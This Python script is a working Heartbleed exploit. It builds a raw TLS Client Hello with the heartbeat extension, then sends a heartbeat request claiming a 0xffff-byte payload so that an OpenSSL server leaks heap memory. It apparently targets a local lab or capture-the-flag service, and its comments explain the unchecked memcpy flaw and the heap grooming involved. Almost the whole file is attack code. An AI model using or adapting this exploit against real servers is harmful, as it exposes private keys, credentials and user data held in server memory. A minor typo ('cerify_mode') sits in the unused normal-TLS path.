#!/usr/bin/python3
import socket
import struct
import ssl

HOST = "localhost"
PORT = 9876

# modes
NORML = 0
HEART = 1
BLEED = 2

MAX_BLEED = 0xffff

def sendClientHello(s):
    hello = bytes.fromhex(
        "16"                        # content type: Handshake
        "03 01"                     # version
        "00 dc"                     # length
        "01"                        # handshake type: Client Hello
        "00 00 d8"                  # length
        "03 03"                     # version
        f"{'ff' * 0x20}"            # random
        "00"                        # session ID len
        "00 66"                     # cipher suites len
        "c0 14 c0 0a c0 22 c0 21"   # cipher suites
        "00 39 00 38 00 88 00 87"
        "c0 0f c0 05 00 35 00 84"
        "c0 12 c0 08 c0 1c c0 1b"
        "00 16 00 13 c0 0d c0 03"
        "00 0a c0 13 c0 09 c0 1f"
        "c0 1e 00 33 00 32 00 9a"
        "00 99 00 45 00 44 c0 0e"
        "c0 04 00 2f 00 96 00 41"
        "c0 11 c0 07 c0 0c c0 02"
        "00 05 00 04 00 15 00 12"
        "00 09 00 14 00 11 00 08"
        "00 06 00 03 00 ff"
        "01 00"                     # compression methods (len 1, method null)
        "00 49"                     # extensions length
        "00 0b 00 04 03 00 01 02"   # ec_points_formats extension
        "00 0a 00 34 00 32 00 0e"   # supported_groups extension
        "00 0d 00 19 00 0b 00 0c"
        "00 18 00 09 00 0a 00 16"
        "00 17 00 08 00 06 00 07"
        "00 14 00 15 00 04 00 05"
        "00 12 00 13 00 01 00 02"
        "00 03 00 0f 00 10 00 11"
        "00 23 00 00"               # session_ticket extension
        "00 0f 00 01 01"            # heartbeat extension (peer allowed to send requests"
        
    )

    s.send(hello)
    return

def sendHeartbeat(s):
    hb = bytes.fromhex(
        "18"                        # type heartbeat
        "03 03"                     # version
        "00 2c"                     # length
        "01"                        # heartbeat type = request
        "00 19"                     # payload length = 
        "3c 33 20 77 69 74 68 20"   # payload
        "6c 6f 76 65 20 66 72 6f"
        "6d 20 61 63 74 70 20 3c"
        "33"
        "00 00 00 00 00 00 00 00"   # 16 bytes of padding
        "00 00 00 00 00 00 00 00"
    )
    s.send(hb)

def sendHeartBleed(s):
    leakamt = MAX_BLEED
    hb = bytes.fromhex(
        "18"                        # type heartbeat
        "03 03"                     # version
        "00 03"                     # length
        "01"                        # heartbeat type = request
        f"{struct.pack('!H', leakamt).hex()}"   # payload length
    )
    s.send(hb)

def regularSSL(s):
    # do a regular ssl wrapping
    ctx = ssl.SSLContext(protocol=ssl.PROTOCOL_TLS)
    ctx.cerify_mode = ssl.CERT_OPTIONAL

    ssk = ctx.wrap_socket(s)

    # read from the server until it stops
    msg = b''
    while True:
        inp = ssk.recv(1024)
        if len(inp) == 0:
            break
        msg += inp

    print(msg)
    
def main():
    mode = BLEED

    # create a connection to the server
    s = socket.create_connection((HOST, PORT))
    print(s.recv(1024))

    # send the command to start tls
    s.send(b"4\n")

    # Do TLS stuff here:
    if mode == NORML:
        regularSSL(s)

    else:
        # manual Client Hello
        sendClientHello(s)

        #recv response
        s.recv(0x1000)

        if mode == HEART:
            sendHeartbeat(s)
        else:
            sendHeartBleed(s)
            # the problem is in tls1_process_heartbeat
            # the data is copied into the buf allocated by OPENSSL_malloc
            # the memcpy following that does
            # memcpy(outputbuf+3, inputbuf+3, payload_len_unchecked)
            # The inputbuf ends up being in an allocation on the heap
            # Other large allocations can end up being leaked
            # but it might take a little grooming
            
            # recv the leak
            leaked = s.recv(MAX_BLEED+1)
            print(leaked)
            

    s.close()

if __name__ == '__main__':
    main()
